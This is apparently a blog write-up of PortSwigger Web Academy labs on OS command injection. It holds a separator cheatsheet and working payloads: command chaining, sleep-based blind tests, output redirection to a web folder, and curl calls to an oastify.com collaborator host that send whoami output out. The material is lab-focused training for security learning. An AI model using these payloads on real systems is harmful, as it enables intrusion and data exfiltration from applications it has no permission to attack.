---
title: OS Command Injection
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2022-10-03 09:00:00 +0200
categories: [Web Application, OS Command Injection]
tags: [Notes, Web Application, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the OS Command Injection vulnerabilities.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/os-command-injection) Labs, but i do intent do throw other labs and writeups here as well.

## TOC

- [Intro](#intro)
  - [TOC](#toc)
- [Cheatsheet - termination](#cheatsheet---termination)
- [OS command injection, simple case](#os-command-injection-simple-case)
- [Blind OS command injection with time delays](#blind-os-command-injection-with-time-delays)
- [Blind OS command injection with output redirection](#blind-os-command-injection-with-output-redirection)
- [Blind OS command injection with out-of-band interaction](#blind-os-command-injection-with-out-of-band-interaction)
- [Blind OS command injection with out-of-band data exfiltration](#blind-os-command-injection-with-out-of-band-data-exfiltration)

# Cheatsheet - termination
```
- &
- &&
- |
- ||
- ;
- Newline (0x0a or \n)
- ` (inline execution) `
- injected command 
- $(injected command)
```
Previous input may be needed to be terminated using quotes, either single or double!

# OS command injection, simple case
>  This lab contains an OS command injection vulnerability in the product stock checker.
> 
> The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
> 
> To solve the lab, execute the whoami command to determine the name of the current user. 

We get a simple app to start with. If we go on a product and scroll to the bottom then we can check the stock there:

![picture 153](/assets/images/5feaeb51169382f90124a2edf9b30eb51e697fe9befb7e4f7b6ef6b870ce2f51.png)  

If we click on `Check Stock`, POST request will be sent out

![picture 154](/assets/images/324cdadc8dbdc9d878d7bbee84d74fdf1b0fc0c43b38cb32970eaa7a2e0c2af7.png)  

There is no sanitization present and the script will be ran on the OS. We can run any command, e.g., `&& ls -la #`

![picture 155](/assets/images/a8e50aa6ec8a4eedc1b93f883b1f756642358b870c9c7ecc60b321b9cb06b60f.png) 

# Blind OS command injection with time delays
>  This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
> 
> To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 

In this lab, we will see no output from the application, and we should cause a delay. We could do sleep 10 or some othe command like ping that runs longer.

Vulnerability is present in the `Submit Feedback`.

![picture 158](/assets/images/82a850b9118dffcd68fd4b73d9839ca80ae999f90d5a04dd005a1eafefc4e911.png)  

OS Injection was done in `email` parameter: `email=email%40email.cm%26+sleep+10+%23` or unencoded `email=email@email.cm& sleep 10 #`

![picture 157](/assets/images/bcecc3d03ca0b62a7492eee8ea655446086f4bbdc772407cb80dcddeeebe5c60.png)  

# Blind OS command injection with output redirection

>  This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
> `/var/www/images/`
>
> The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
> 
> To solve the lab, execute the whoami command and retrieve the output. 

This lab will be interessting as we have to write output to the file. 

First simply test if we have an OS injection. I've used simple sleep again: `csrf=nIGTkly4lit9MZDY3vDoYVKDJMAjyAWQ&name=a&email=b@A.com%26sleep+5+%23&subject=c&message=d`, with payload (unencoded): `&sleep 5 #`.

To solve the lab, save the whoami output to the writable directory `/var/www/images`. Payload (unencoded): `email=b@A.com&whoami>/var/www/images/whoami.out #`.

Success with reading the file using `/image?filename=whoami.out`. How to read the file can be determined by observing the source code. This is how other images are read and displayed.

![picture 159](/assets/images/acc06e3ae7ffa8080b68e2b2bc06d7a169e629ba41177c9a4a768cc2a61b8f3b.png)  

# Blind OS command injection with out-of-band interaction

>  This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
> 
> To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

This lab looks like the ones above, injection point however is in the email paramter on the feedback form and can be achieved like this

```
csrf=ECWUj4AxoEgQQ8bEHffDFlgZ53b9gXuc&name=1&&email=test%40test.de%|`curl+http://b5hgyt5dzs0yckok2u6vgk2kqbw2k08p.oastify.com`&subject=3&message=4
```

# Blind OS command injection with out-of-band data exfiltration

>  This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
> 
> To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

In this lab we have to run `whoami` command and exfiltrate it to our server. 

Injection point is the same like in the lab above!

We can run subcommand in subcommand like this:

```
...email=test%40test.de|$(curl+http://`whoami`.b5hgyt5dzs0yckok2u6vgk2kqbw2k08p.oastify.com)...
```
